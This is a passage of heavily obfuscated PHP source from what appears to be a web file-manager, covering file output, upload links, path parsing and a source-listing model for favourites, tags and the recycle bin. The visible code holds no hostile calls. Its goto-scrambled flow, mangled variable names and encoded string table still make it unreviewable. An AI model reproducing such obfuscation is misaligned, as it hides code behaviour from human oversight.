$e½„•¥„î[$f½°†º˜Ÿˆ[76]], $F‡•â¶ÆÒˆ); return $this->getPathOuter($B²ÉÚ†ŞìÕ); } public function addFileByRemote($BŸå†åÛäÅ, $CóºˆÓ±…Â, $b¹Á–È£ = array(), $AèŒ÷óÅ¤¤ = '', $EÄ°ä»“è) { $DÙ×·‰¾¿¸ =& $_SERVER[´¬]; $d¦Ò¿ùÉ®  = $this->parse($BŸå†åÛäÅ); $AèŒ÷óÅ¤¤ = empty($AèŒ÷óÅ¤¤) ? $d¦Ò¿ùÉ® [$DÙ×·‰¾¿¸[76]] : $AèŒ÷óÅ¤¤; $dİŒâÚÛ°ì = $this->model->addFileByRemote($d¦Ò¿ùÉ® [$DÙ×·‰¾¿¸[392]], $CóºˆÓ±…Â, $AèŒ÷óÅ¤¤, $b¹Á–È£, $EÄ°ä»“è); return $this->getPathOuter($dİŒâÚÛ°ì); } public function uploadLink($c„Ú÷°…óç, $b¦Ó´³–ï® = 0) { $b„±ïæÈ„ =& $_SERVER[´¬]; $E¿æçœßÄİ = $this->parse($c„Ú÷°…óç); $AÛÌÉ¿Ò = _get($GLOBALS[$b„±ïæÈ„[7]], $b„±ïæÈ„[1208]); $c×ÖÅ‹™Ö´ = _get($GLOBALS[$b„±ïæÈ„[7]], $b„±ïæÈ„[1209]); $c„Ú÷°…óç = Model($b„±ïæÈ„[570])->createFileName($E¿æçœßÄİ[$b„±ïæÈ„[76]], $AÛÌÉ¿Ò, $c×ÖÅ‹™Ö´); return IO::uploadLink($c„Ú÷°…óç, $b¦Ó´³–ï®); } public function fileNameAuto($E‰ƒõº•ù‚, $C®½¦É•, $c³ÁĞ×³ = REPEAT_REPLACE, $cÖÑˆ¿İ» = false) { return $this->model->fileNameAuto($E‰ƒõº•ù‚, $C®½¦É•, $c³ÁĞ×³, $cÖÑˆ¿İ»); } public function fileNameExist($AÀİÖÊÙõ, $d÷ç”ŠùÖ) { return $this->model->fileNameExist($AÀİÖÊÙõ, $d÷ç”ŠùÖ); } protected function _fileOut($CÍù¤½Şƒ‡, $c‘¼á…±‡ë = false, $Aä˜‘ŒÜš– = false, $d¬Ç•„×ó† = '', $d ¶æ“”¼„ = false) { goto A®Š¥øîù÷; B–Ó‹ù¥Ö: $F“Œ«çß·œ = $this->model->fileInfoGet($CÍù¤½Şƒ‡); $d¬Ç•„×ó† = $F“Œ«çß·œ[$eƒ¡ÀÀŒÌ©[170]] ? $F“Œ«çß·œ[$eƒ¡ÀÀŒÌ©[170]] : $d¬Ç•„×ó†; $CšˆÎ©ïÎâ = isset($GLOBALS[$eƒ¡ÀÀŒÌ©[1211]]) ? $GLOBALS[$eƒ¡ÀÀŒÌ©[1211]] : $BšØ¡çÒ[$eƒ¡ÀÀŒÌ©[28]]; goto dŞêÑÖ‰®Ÿ; dŞêÑÖ‰®Ÿ: if ($d ¶æ“”¼„) { return IO::fileOutServer($F“Œ«çß·œ[$eƒ¡ÀÀŒÌ©[76]], $c‘¼á…±‡ë, $CšˆÎ©ïÎâ, $d¬Ç•„×ó†); } IO::fileOut($F“Œ«çß·œ[$eƒ¡ÀÀŒÌ©[76]], $c‘¼á…±‡ë, $CšˆÎ©ïÎâ, $d¬Ç•„×ó†); goto bÊÅ’’ãğ¶; A®Š¥øîù÷: $eƒ¡ÀÀŒÌ© =& $_SERVER[´¬]; $BšØ¡çÒ = $this->model->sourceInfo($CÍù¤½Şƒ‡); if ($BšØ¡çÒ[$eƒ¡ÀÀŒÌ©[401]] == $eƒ¡ÀÀŒÌ©[87]) { header($eƒ¡ÀÀŒÌ©[1210]); die; } goto B–Ó‹ù¥Ö; bÊÅ’’ãğ¶: } public function fileOut($B»å£ºôÛ, $bçÆã–×Åİ = false, $AŠÈ«‘õ = false, $eóÎ‹‰÷ = '') { $this->_fileOut($B»å£ºôÛ, $bçÆã–×Åİ, $AŠÈ«‘õ, $eóÎ‹‰÷); } public function fileOutServer($F¿øµÇÛˆ, $eÎîéáÅ›É = false, $bœˆ¡Óíƒ  = false, $aÜÔ†…•ªÑ = '') { $this->_fileOut($F¿øµÇÛˆ, $eÎîéáÅ›É, $bœˆ¡Óíƒ , $aÜÔ†…•ªÑ, !0); } protected function _fileOutImage($Cí¦Ø‰¤ø¬, $aóµšÄ¡¬Ñ = 250) { goto dÍİ‘¿ŠÄ†; D©ªÎäÌÍî: $GLOBALS[$eĞ¹ÑÎ†Ô[1211]] = $Dñ´±ª‰àó[$eĞ¹ÑÎ†Ô[28]]; $GLOBALS[$eĞ¹ÑÎ†Ô[162]] = $Dñ´±ª‰àó; IO::fileOutImage($Dñ´±ª‰àó[$eĞ¹ÑÎ†Ô[76]], $aóµšÄ¡¬Ñ); goto DÂÚğ°…ë; Cš÷ã¹˜¿ƒ: $Dñ´±ª‰àó = $this->model->fileInfoGet($Cí¦Ø‰¤ø¬); $Dñ´±ª‰àó[$eĞ¹ÑÎ†Ô[28]] = $C»Ò§­ÑÚŒ[$eĞ¹ÑÎ†Ô[28]]; $Dñ´±ª‰àó[$eĞ¹ÑÎ†Ô[163]] = $C»Ò§­ÑÚŒ[$eĞ¹ÑÎ†Ô[163]]; goto D©ªÎäÌÍî; dÍİ‘¿ŠÄ†: $eĞ¹ÑÎ†Ô =& $_SERVER[´¬]; $C»Ò§­ÑÚŒ = $this->model->pathInfo($Cí¦Ø‰¤ø¬); if ($C»Ò§­ÑÚŒ[$eĞ¹ÑÎ†Ô[401]] == $eĞ¹ÑÎ†Ô[87]) { show_json($eĞ¹ÑÎ†Ô[1212] . $Cí¦Ø‰¤ø¬, !1); } goto Cš÷ã¹˜¿ƒ; DÂÚğ°…ë: } public function fileOutImage($F¿À¢Ûó›, $BæÏ™•òìØ = 250) { $this->_fileOutImage($F¿À¢Ûó›, $BæÏ™•òìØ); } public function fileOutImageServer($EÊ©§ĞÒ‘, $Eî³ÒŠ¥¢Á = 250) { $this->_fileOutImage($EÊ©§ĞÒ‘, $Eî³ÒŠ¥¢Á); } public function link($a…Ş¢……ÊÛ, $CÅ”ç‚„³À = '') { $B×¨ÑƒË = $this->model->fileInfoGet($a…Ş¢……ÊÛ); return IO::link($B×¨ÑƒË[$_SERVER[´¬][76]], $CÅ”ç‚„³À); } protected function parse($EìŒ­Š¦Â¢) { $cŞ¶ã”¬Š =& $_SERVER[´¬]; if (strstr($EìŒ­Š¦Â¢, $cŞ¶ã”¬Š[8]) === !1) { return array($cŞ¶ã”¬Š[410] => intval($EìŒ­Š¦Â¢), $cŞ¶ã”¬Š[76] => $cŞ¶ã”¬Š[33], $cŞ¶ã”¬Š[1207] => array()); } $e›Âˆ²µ¡ = explode($cŞ¶ã”¬Š[8], trim($EìŒ­Š¦Â¢, $cŞ¶ã”¬Š[8])); if (count($e›Âˆ²µ¡) < 2) { show_tips($EìŒ­Š¦Â¢ . $cŞ¶ã”¬Š[1213]); } return array($cŞ¶ã”¬Š[410] => intval($e›Âˆ²µ¡[0]), $cŞ¶ã”¬Š[76] => $e›Âˆ²µ¡[1], $cŞ¶ã”¬Š[1207] => array_slice($e›Âˆ²µ¡, 1)); } } goto eÀ¼éÓ¸À½; FÔ°ª¥’‹ô: class SourceListModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\x6f\165\x72\143\145"; protected $tableMeta = array("\x74\x61\142\x6c\145\x4e\141\155\x65" => "\151\157\x5f\x73\157\165\162\x63\x65\137\155\x65\164\141", "\x6d\x65\x74\141\106\151\x65\x6c\144" => "\163\x6f\x75\162\143\145\x49\x44"); protected $dataAuto = array(array("\x6d\157\144\x69\x66\171\124\x69\x6d\145", "\x74\151\155\x65", "\151\156\x73\145\x72\164", "\x66\x75\x6e\x63\x74\x69\x6f\x6e"), array("\x63\162\145\141\x74\145\124\151\155\145", "\164\x69\155\x65", "\151\156\163\145\x72\x74", "\x66\165\156\x63\x74\x69\157\x6e"), array("\x76\151\x65\x77\124\x69\x6d\145", "\164\151\x6d\x65", "\x69\156\163\x65\162\164", "\146\x75\156\x63\x74\151\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($eèÁ’Ô§­) { return $this->listSource(array($_SERVER[´¬][393] => $eèÁ’Ô§­)); } public function typeName($aÉ¾¹îˆÔ§) { static $E«ÈÜ°³£ = array(self::TYPE_SYSTEM => "\163\x79\163\164\145\155", self::TYPE_USER => "\x75\x73\145\x72", self::TYPE_GROUP => "\x67\x72\x6f\165\160"); return $E«ÈÜ°³£[$aÉ¾¹îˆÔ§ . $_SERVER[´¬][33]]; } public function sourceListInfo($c÷Ô»ì‡Ü‹, $bĞáâ§×Ô = false) { goto b‚œ¥ÁĞ¿Ã; b‚œ¥ÁĞ¿Ã: $FŠ—˜ÔŒÓ‡ =& $_SERVER[´¬]; $c÷Ô»ì‡Ü‹ = $c÷Ô»ì‡Ü‹ ? $c÷Ô»ì‡Ü‹ : array(); $c÷Ô»ì‡Ü‹ = array_filter(array_unique($c÷Ô»ì‡Ü‹)); goto AÍÕáİÜºİ; AÍÕáİÜºİ: if (!$c÷Ô»ì‡Ü‹) { return array(); } $eà©…©Ûæ“ = $this->where(array($FŠ—˜ÔŒÓ‡[394] => array($FŠ—˜ÔŒÓ‡[7], $c÷Ô»ì‡Ü‹)))->select(); $this->_listDataApply($eà©…©Ûæ“, $bĞáâ§×Ô); goto AÃÌƒê’Ù; AÃÌƒê’Ù: return array_to_keyvalue($eà©…©Ûæ“, $FŠ—˜ÔŒÓ‡[394]); goto F²÷ªëñÁ¾; F²÷ªëñÁ¾: } public function pathInfoFilter(&$AšöÑç×Îã) { goto bƒã‹Úª„Ê; EÚ‹ŒÑõ²: $AšöÑç×Îã[$f‘°ÀÇ…³[402]] = $this->typeName($AšöÑç×Îã[$f‘°ÀÇ…³[402]]); if ($AšöÑç×Îã[$f‘°ÀÇ…³[401]] != 1) { $AšöÑç×Îã[$f‘°ÀÇ…³[168]] = $AšöÑç×Îã[$f‘°ÀÇ…³[403]]; unset($AšöÑç×Îã[$f‘°ÀÇ…³[403]]); } $A‚áè¿§ØÚ = $BöÊÔïğ¼ß; goto E’¢“ìÎâİ; E’¢“ìÎâİ: if (isset($AšöÑç×Îã[$f‘°ÀÇ…³[404]]) && $AšöÑç×Îã[$f‘°ÀÇ…³[404]][$f‘°ÀÇ…³[405]] == -1) { $A‚áè¿§ØÚ = $c¿ÅÛñ®Õî; } $AšöÑç×Îã = array_field_key($AšöÑç×Îã, $A‚áè¿§ØÚ); return $AšöÑç×Îã; goto e“‡à¾ÜèÁ; eÊÃ²¢‰™: if (!$BöÊÔïğ¼ß) { goto F’ê±œÆÀ; E÷†ÜÓíî¨: $c¿ÅÛñ®Õî = array(); foreach ($BöÊÔïğ¼ß as $cŠø…¯½¦) { if (in_array($cŠø…¯½¦, $f»ƒ™Ğãæø)) { continue; } $c¿ÅÛñ®Õî[] = $cŠø…¯½¦; } goto F»á •×®Ş; d«¤§¡©ß: $fôË†Öò¾¿ = $f‘°ÀÇ…³[398]; $f»ƒ™Ğãæø = explode($f‘°ÀÇ…³[47], $fôË†Öò¾¿); $BöÊÔïğ¼ß = explode($f‘°ÀÇ…³[47], $Bã¦Í«‘ñ); goto E÷†ÜÓíî¨; F’ê±œÆÀ: $Bã¦Í«‘ñ = $f‘°ÀÇ…³[395]; $Bã¦Í«‘ñ .= $f‘°ÀÇ…³[396]; $Bã¦Í«‘ñ .= $f‘°ÀÇ…³[397]; goto d«¤§¡©ß; F»á •×®Ş: } $AšöÑç×Îã[$f‘°ÀÇ…³[76]] = $f‘°ÀÇ…³[399] . $AšöÑç×Îã[$f‘°ÀÇ…³[394]] . $f‘°ÀÇ…³[400]; $AšöÑç×Îã[$f‘°ÀÇ…³[29]] = $AšöÑç×Îã[$f‘°ÀÇ…³[401]] == 1 ? $f‘°ÀÇ…³[77] : $f‘°ÀÇ…³[192]; goto EÚ‹ŒÑõ²; bƒã‹Úª„Ê: $f‘°ÀÇ…³ =& $_SERVER[´¬]; static $BöÊÔïğ¼ß = false; static $c¿ÅÛñ®Õî = false; goto eÊÃ²¢‰™; e“‡à¾ÜèÁ: } public function listUserFav() { goto dğ«ÊòÅµ; a¾ÙŒƒğŒ¤: $båÁÛùÖÄ = array_to_keyvalue($båÁÛùÖÄ, $a”ôÖ¬ ¥[33], $a”ôÖ¬ ¥[76]); if ($båÁÛùÖÄ) { $aù“ó´×İ­ = $this->listSource(array($a”ôÖ¬ ¥[408] => array($a”ôÖ¬ ¥[409], $båÁÛùÖÄ))); } $aù“ó´×İ­ = array_to_keyvalue($aù“ó´×İ­[$a”ôÖ¬ ¥[366]], $a”ôÖ¬ ¥[394]); goto Bö×·‚àÇ; Bö×·‚àÇ: foreach ($eºç‰»¡ä¢ as &$cù­À×®‰¸) { $cù­À×®‰¸ = array($a”ôÖ¬ ¥[410] => $cù­À×®‰¸[$a”ôÖ¬ ¥[392]], $a”ôÖ¬ ¥[411] => $cù­À×®‰¸[$a”ôÖ¬ ¥[28]], $a”ôÖ¬ ¥[412] => $cù­À×®‰¸[$a”ôÖ¬ ¥[76]], $a”ôÖ¬ ¥[413] => $cù­À×®‰¸[$a”ôÖ¬ ¥[29]], $a”ôÖ¬ ¥[414] => $cù­À×®‰¸[$a”ôÖ¬ ¥[193]], $a”ôÖ¬ ¥[415] => $cù­À×®‰¸[$a”ôÖ¬ ¥[84]]); if ($cù­À×®‰¸[$a”ôÖ¬ ¥[29]] == $a”ôÖ¬ ¥[407] && $aù“ó´×İ­[$cù­À×®‰¸[$a”ôÖ¬ ¥[76]]]) { $cù­À×®‰¸[$a”ôÖ¬ ¥[85]] = $aù“ó´×İ­[$cù­À×®‰¸[$a”ôÖ¬ ¥[76]]]; } } unset($cù­À×®‰¸); return $eºç‰»¡ä¢; goto A³¶†£ ¡‰; dğ«ÊòÅµ: $a”ôÖ¬ ¥ =& $_SERVER[´¬]; $eºç‰»¡ä¢ = Model($a”ôÖ¬ ¥[406])->listData(); $båÁÛùÖÄ = array_filter_by_field($eºç‰»¡ä¢, $a”ôÖ¬ ¥[29], $a”ôÖ¬ ¥[407]); goto a¾ÙŒƒğŒ¤; A³¶†£ ¡‰: } public function listUserTag($eÔ¼„×…È†) { goto Bº§ÒÔ¬“Ó; FŒº»İŸˆ: $BÛ‚¯Ù³ÚÕ = array(); foreach ($C™Ğ‚ïƒ¸Ì as $f £‚–è) { $aÉ¸Æ§¦Ø = $f £‚–è[$d÷†Ö…Ô¬Ğ[76]]; if (!$aÉ¸Æ§¦Ø) { continue; } if (!isset($BÛ‚¯Ù³ÚÕ[$aÉ¸Æ§¦Ø])) { $BÛ‚¯Ù³ÚÕ[$aÉ¸Æ§¦Ø] = array(); } $BÛ‚¯Ù³ÚÕ[$aÉ¸Æ§¦Ø][] = $f £‚–è[$d÷†Ö…Ô¬Ğ[417]]; } $fÉŠöœöÍÑ = array(); goto bÒ˜šé¸øğ; bÒ˜šé¸øğ: foreach ($BÛ‚¯Ù³ÚÕ as $Dâí”ĞæšĞ => $EùÒŠìàÒë) { $fÅñ†™°¹Â = !0; if (!$eÔ¼„×…È†) { $fÉŠöœöÍÑ[] = $Dâí”ĞæšĞ; continue; } foreach ($eÔ¼„×…È† as $fÊØÆô) { if (!in_array($fÊØÆô, $EùÒŠìàÒë)) { $fÅñ†™°¹Â = !1; break; } } if ($fÅñ†™°¹Â) { $fÉŠöœöÍÑ[] = $Dâí”ĞæšĞ; } } if (!$fÉŠöœöÍÑ) { return array(); } $Bğ§â‡ÖÃ¾ = $this->listSource(array($d÷†Ö…Ô¬Ğ[408] => array($d÷†Ö…Ô¬Ğ[409], $fÉŠöœöÍÑ))); goto FÎóÙ¬ª†Ç; dÏĞ…åÔà©: if ($d˜­•œÀçÙ) { Model($d÷†Ö…Ô¬Ğ[418])->removeBySource($d˜­•œÀçÙ); } return $Bğ§â‡ÖÃ¾; goto C—ëÕ˜ªËã; Bº§ÒÔ¬“Ó: $d÷†Ö…Ô¬Ğ =& $_SERVER[´¬]; if ($eÔ¼„×…È† && !is_array($eÔ¼„×…È†)) { $eÔ¼„×…È† = array($eÔ¼„×…È†); } $C™Ğ‚ïƒ¸Ì = Model($d÷†Ö…Ô¬Ğ[416])->listData(); goto FŒº»İŸˆ; dšòŞ©É´ö: $Cñ·µ¡Ò¿² = array_to_keyvalue($Bğ§â‡ÖÃ¾[$d÷†Ö…Ô¬Ğ[74]], $d÷†Ö…Ô¬Ğ[33], $d÷†Ö…Ô¬Ğ[394]); $Dœ×œò®²± = array_merge($Cñ·µ¡Ò¿², $Cõ›æ¥ğ); foreach ($fÉŠöœöÍÑ as $aÉ¸Æ§¦Ø) { if (!in_array($aÉ¸Æ§¦Ø, $Dœ×œò®²±)) { $d˜­•œÀçÙ[] = $aÉ¸Æ§¦Ø; } } goto dÏĞ…åÔà©; FÎóÙ¬ª†Ç: if (!$Bğ§â‡ÖÃ¾ || count($fÉŠöœöÍÑ) == $Bğ§â‡ÖÃ¾[$d÷†Ö…Ô¬Ğ[363]][$d÷†Ö…Ô¬Ğ[364]]) { return $Bğ§â‡ÖÃ¾; } $d˜­•œÀçÙ = array(); $Cõ›æ¥ğ = array_to_keyvalue($Bğ§â‡ÖÃ¾[$d÷†Ö…Ô¬Ğ[75]], $d÷†Ö…Ô¬Ğ[33], $d÷†Ö…Ô¬Ğ[394]); goto dšòŞ©É´ö; C—ëÕ˜ªËã: } public function listUserRecycle() { $F×ë¦¾ã×º =& $_SERVER[´¬]; $cºÚÑ„‹¸Ğ = Model($F×ë¦¾ã×º[419])->listData(); if (!$cºÚÑ„‹¸Ğ) { return array(); } $eõ¡ÜÀ—ƒå = array($F×ë¦¾ã×º[408] => array($F×ë¦¾ã×º[409], $cºÚÑ„‹¸Ğ), $F×ë¦¾ã×º[420] => 1); return $this->listSource($eõ¡ÜÀ—ƒå); } public function listSource($Bóßˆ¹µŞä, $EÜ‡Ş§…¸é = 3000) { goto cÛ ·­İÊ; aª‡Ñ„ø: return $b­Üù‰³ñ; goto d’—Ãœ§Ë; cÛ ·­İÊ: $a’¤ÚĞçç =& $_SERVER[´¬]; if (!isset($Bóßˆ¹µŞä[$a’¤ÚĞçç[421]])) { $Bóßˆ¹µŞä[$a’¤ÚĞçç[421]] = 0; } $C‹İ¨¹µ¼ = $a’¤ÚĞçç[422]; goto cÛÈÒÔ°Ï´; cÛÈÒÔ°Ï´: $b­Üù‰³ñ = $this->field($C‹İ¨¹µ¼)->_makeOrder()->where($Bóßˆ¹µŞä)->selectPage($EÜ‡Ş§…¸é); $this->_listDataApply($b­Üù‰³ñ[$a’¤ÚĞçç[366]]); $this->_listMake($b­Üù‰³ñ); goto aª‡Ñ„ø; d’—Ãœ§Ë: } protected function _makeOrder() { goto aÄˆŠ•®ã¸; EÇÇÚ‘ôøÄ: $a«Š§’á‰‡ = Input::get($AÂÔÒ¦ñÂî[434], $AÂÔÒ¦ñÂî[7], $BÄ²±ó‹—‹, array_keys($Eœ ˜ÎïÎ)); if (!in_array($aòœ•á×ç, array_keys($DùÖø¼Üë¡))) { $aòœ•á×ç = $AÂÔÒ¦ñÂî[28]; } if (!in_array($a«Š§’á‰‡, array_keys($Eœ ˜ÎïÎ))) { $aòœ•á×ç = $AÂÔÒ¦ñÂî[426]; } goto F¾÷Ü·ØÚ; F¾÷Ü·ØÚ: if ($aòœ•á×ç == $AÂÔÒ¦ñÂî[28]) { } $a×ºÂÑ´Î = $AÂÔÒ¦ñÂî[435] . $DùÖø¼Üë¡[$aòœ•á×ç] . $AÂÔÒ¦ñÂî[50] . $Eœ ˜ÎïÎ[$a«Š§’á‰‡]; return $this->order(rtrim(trim($a×ºÂÑ´Î), $AÂÔÒ¦ñÂî[47])); goto Dåº“¦À„–; B¬õø‡Â´Ğ: $Eœ ˜ÎïÎ = array($AÂÔÒ¦ñÂî[426] => $AÂÔÒ¦ñÂî[427], $AÂÔÒ¦ñÂî[428] => $AÂÔÒ¦ñÂî[429]); $DùÖø¼Üë¡ = array($AÂÔÒ¦ñÂî[28] => $AÂÔÒ¦ñÂî[28], $AÂÔÒ¦ñÂî[78] => $AÂÔÒ¦ñÂî[78], $AÂÔÒ¦ñÂî[168] => $AÂÔÒ¦ñÂî[403], $AÂÔÒ¦ñÂî[430] => $AÂÔÒ¦ñÂî[430], $AÂÔÒ¦ñÂî[431] => $AÂÔÒ¦ñÂî[432], $AÂÔÒ¦ñÂî[193] => $AÂÔÒ¦ñÂî[193], $AÂÔÒ¦ñÂî[84] => $AÂÔÒ¦ñÂî[84]); $aòœ•á×ç = Input::get($AÂÔÒ¦ñÂî[433], $AÂÔÒ¦ñÂî[7], $bÚò°Éß¨µ, array_keys($DùÖø¼Üë¡)); goto EÇÇÚ‘ôøÄ; aÄˆŠ•®ã¸: $AÂÔÒ¦ñÂî =& $_SERVER[´¬]; $bÚò°Éß¨µ = Model($AÂÔÒ¦ñÂî[423])->get($AÂÔÒ¦ñÂî[424]); $BÄ²±ó‹—‹ = Model($AÂÔÒ¦ñÂî[423])->get($AÂÔÒ¦ñÂî[425]); goto B¬õø‡Â´Ğ; Dåº“¦À„–: } protected function _listDataApplyItem($C¨ß§î‰®£, $C¥‹¤ø§÷ = false) { $c¤ˆÑ¢é„ = array($C¨ß§î‰®£); $this->_listDataApply($c¤ˆÑ¢é„, $C¥‹¤ø§÷); return $c¤ˆÑ¢é„[0]; } protected function _listDataApply(&$d£¯¼ŠÒ¿Œ, $añº“Ç¸À = false) { goto cÇ¯ÛƒÑØ; eŒíËºÊ¥: $D¨Ìçõ¾÷ = array_unique($D¨Ìçõ¾÷); $this->_listSourceCache($d£¯¼ŠÒ¿Œ); if (!$añº“Ç¸À) { $this->_listAppendMeta($d£¯¼ŠÒ¿Œ, $D¨Ìçõ¾÷); $this->_listAppendFileMeta($d£¯¼ŠÒ¿Œ, $D¨Ìçõ¾÷); $this->_listAppendChildren($d£¯¼ŠÒ¿Œ, $D¨Ìçõ¾÷); } goto e¨¸ö°®ŒŞ; e¨¸ö°®ŒŞ: $this->_listAppendPath($d£¯¼ŠÒ¿Œ); $this->_listAppendAuth($d£¯¼ŠÒ¿Œ); $this->_listAppendSourceInfo($d£¯¼ŠÒ¿Œ, $D¨Ìçõ¾÷); goto DÖŒ˜¢ëƒÌ; cÇ¯ÛƒÑØ: $a¸òö¶¦ê¢ =& $_SERVER[´¬]; if (!$d£¯¼ŠÒ¿Œ) { $d£¯¼ŠÒ¿Œ = array(); return; } $D¨Ìçõ¾÷ = array_to_keyvalue($d£¯¼ŠÒ¿Œ, $a¸òö¶¦ê¢[33], $a¸òö¶¦ê¢[394]); goto eŒíËºÊ¥; DÖŒ˜¢ëƒÌ: $this->_listAppendUser($d£¯¼ŠÒ¿Œ); $this->_listFilterInfo($d£¯¼ŠÒ¿Œ, $añº“Ç¸À); goto b÷ÙŠ«‡‘ˆ; b÷ÙŠ«‡‘ˆ: } protected function _listSourceCache($aõµ’÷è¤÷) { $FøŠÏÊÄ‡Š =& $_SERVER[´¬]; foreach ($aõµ’÷è¤÷ as $AËÔéù”ñ) { self::$cacheSourceInfo[$FøŠÏÊÄ‡Š[436] . $AËÔéù”ñ[$FøŠÏÊÄ‡Š[394]]] = $AËÔéù”ñ; } } protected function _listFilterInfo(&$AËŞˆ†Úµë, $EÖÚÈ‚Î¸· = false) { $Dõ­Å˜¤› =& $_SERVER[´¬]; foreach ($AËŞˆ†Úµë as &$b‚Ëè‚ä¨) { $b‚Ëè‚ä¨ = $this->pathInfoFilter($b‚Ëè‚ä¨); self::$cachePathInfo[$Dõ­Å˜¤›[437] . intval($EÖÚÈ‚Î¸·) . $Dõ­Å˜¤›[438] . $b‚Ëè‚ä¨[$Dõ­Å˜¤›[394]]] = $b‚Ëè‚ä¨; } unset($b‚Ëè‚ä¨); } protected function _listMake(&$Fâµ©’à®ò) { $d®¸˜ÇÑØ‹ =& $_SERVER[´¬]; $Fâµ©’à®ò[$d®¸˜ÇÑØ‹[75]] = array(); $Fâµ©’à®ò[$d®¸˜ÇÑØ‹[74]] = array(); foreach ($Fâµ©’à®ò[$d®¸˜ÇÑØ‹[366]] as $aÎ¨¼›¨õÑ) { $C¢¡ÛØ Ÿë = $aÎ¨¼›¨õÑ[$d®¸˜ÇÑØ‹[401]] == 1 ? $d®¸˜ÇÑØ‹[75] : $d®¸˜ÇÑØ‹[74]; $Fâµ©’à®ò[$C¢¡ÛØ Ÿë][] = $aÎ¨¼›¨õÑ; } unset($Fâµ©’à®ò[$d®¸˜ÇÑØ‹[366]]); } protected function _listAppendMeta(&$a©ÏÕçÙ§, $F¯æ‡²…§ì) { goto Eë¹à´ãÅ; b‹òÕÙê×²: foreach ($Aë¦­íîÌ´ as $FÈ‚È«Æ²Œ) { if (!isset($FŒó¨è©Ø[$FÈ‚È«Æ²Œ[$B¦§õºÍ[394]]])) { $FŒó¨è©Ø[$FÈ‚È«Æ²Œ[$B¦§õºÍ[394]]] = array(); } if (in_array($FÈ‚È«Æ²Œ[$B¦§õºÍ[93]], $b†„¼¢­›)) { continue; } $FŒó¨è©Ø[$FÈ‚È«Æ²Œ[$B¦§õºÍ[394]]][$FÈ‚È«Æ²Œ[$B¦§õºÍ[93]]] = $FÈ‚È«Æ²Œ[$B¦§õºÍ[371]]; } foreach ($a©ÏÕçÙ§ as &$A…ÚÔˆÜŞ™) { $A…ÚÔˆÜŞ™[$B¦§õºÍ[443]] = !1; if (isset($FŒó¨è©Ø[$A…ÚÔˆÜŞ™[$B¦§õºÍ[394]]])) { $A…ÚÔˆÜŞ™[$B¦§õºÍ[443]] = $FŒó¨è©Ø[$A…ÚÔˆÜŞ™[$B¦§õºÍ[394]]]; } if ($this->fileIsLock($A…ÚÔˆÜŞ™) && $A…ÚÔˆÜŞ™[$B¦§õºÍ[404]]) { $aé„ĞïÍ¢» = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $A…ÚÔˆÜŞ™[$B¦§õºÍ[404]][$B¦§õºÍ[405]] = AuthModel::authDisable($A…ÚÔˆÜŞ™[$B¦§õºÍ[404]][$B¦§õºÍ[405]], $aé„ĞïÍ¢»); $A…ÚÔˆÜŞ™[$B¦§õºÍ[404]][$B¦§õºÍ[444]][$B¦§õºÍ[404]] = $A…ÚÔˆÜŞ™[$B¦§õºÍ[404]][$B¦§õºÍ[405]]; } } unset($A…ÚÔˆÜŞ™); goto e»™Ô¦¢°¦; Eë¹à´ãÅ: $B¦§õºÍ =& $_SERVER[´¬]; $E–’ÔÜÊÈ¹ = array($B¦§õºÍ[408] => array($B¦§õºÍ[409], $F¯æ‡²…§ì)); $Aë¦­íîÌ´ = Model($B¦§õºÍ[439])->field($B¦§õºÍ[440])->where($E–’ÔÜÊÈ¹)->select(); goto DŒ­ÉÕ¨¼; DŒ­ÉÕ¨¼: if (!$Aë¦­íîÌ´) { return; } $b†„¼¢­› = array($B¦§õºÍ[441], $B¦§õºÍ[442]); $FŒó¨è©Ø = array(); goto b‹òÕÙê×²; e»™Ô¦¢°¦: } protected function _listAppendFileMeta(&$f·Ã¹¾Ó‚É, $Eå‹ÜÓˆÂ) { goto BÍšïÈÔª•; a„ß˜¬ã©ò: $Bà¤‚Éçà = $Bà¤‚Éçà ? $Bà¤‚Éçà : array(); $B¯’éäÁÔµ = array(); foreach ($Bà¤‚Éçà as $DÊÈÂØÏ°•) { if (!isset($B¯’éäÁÔµ[$DÊÈÂØÏ°•[$d·ÊäãˆÃ[445]]])) { $B¯’éäÁÔµ[$DÊÈÂØÏ°•[$d·ÊäãˆÃ[445]]] = array(); } $B¯’éäÁÔµ[$DÊÈÂØÏ°•[$d·ÊäãˆÃ[445]]][$DÊÈÂØÏ°•[$d·ÊäãˆÃ[93]]] = $DÊÈÂØÏ°•[$d·ÊäãˆÃ[371]]; } goto cÚƒ‚¦¨‚½; Dîß±Œé»: if (!$Fï¯Ï‡) { return; } $CŸë¾²áĞä = array($d·ÊäãˆÃ[446] => array($d·ÊäãˆÃ[409], $Fï¯Ï‡)); $aëæ©ÔŸ¦ = $d·ÊäãˆÃ[447]; goto b„¡†³ß³; BÍšïÈÔª•: $d·ÊäãˆÃ =& $_SERVER[´¬]; $Fï¯Ï‡ = array_to_keyvalue($f·Ã¹¾Ó‚É, $d·ÊäãˆÃ[33], $d·ÊäãˆÃ[445]); $Fï¯Ï‡ = array_filter(array_unique($Fï¯Ï‡)); goto Dîß±Œé»; cÚƒ‚¦¨‚½: foreach ($f·Ã¹¾Ó‚É as &$f‘Ëà†ç£) { goto a©“•÷Öï; dÏÜ•Õ²Âå: $AœøÓªñ‘[$d·ÊäãˆÃ[78]] = $f‘Ëà†ç£[$d·ÊäãˆÃ[78]]; $AœøÓªñ‘[$d·ÊäãˆÃ[28]] = $f‘Ëà†ç£[$d·ÊäãˆÃ[28]]; if (!isset(self::$cacheFileInfo[$d·ÊäãˆÃ[451] . $B††Ù˜óÅ›])) { self::$cacheFileInfo[$d·ÊäãˆÃ[451] . $B††Ù˜óÅ›] = array_merge(array(), $AœøÓªñ‘); } goto A‰ìß²‡å¾; aÂÙ˜ÑŠà´: if (isset($f‘Ëà†ç£[$d·ÊäãˆÃ[164]][$d·ÊäãˆÃ[163]])) { $f‘Ëà†ç£[$d·ÊäãˆÃ[163]] = json_decode($f‘Ëà†ç£[$d·ÊäãˆÃ[164]][$d·ÊäãˆÃ[163]], !0); unset($f‘Ëà†ç£[$d·ÊäãˆÃ[164]][$d·ÊäãˆÃ[163]]); } goto F£§—½¶ßÈ; A‰ìß²‡å¾: 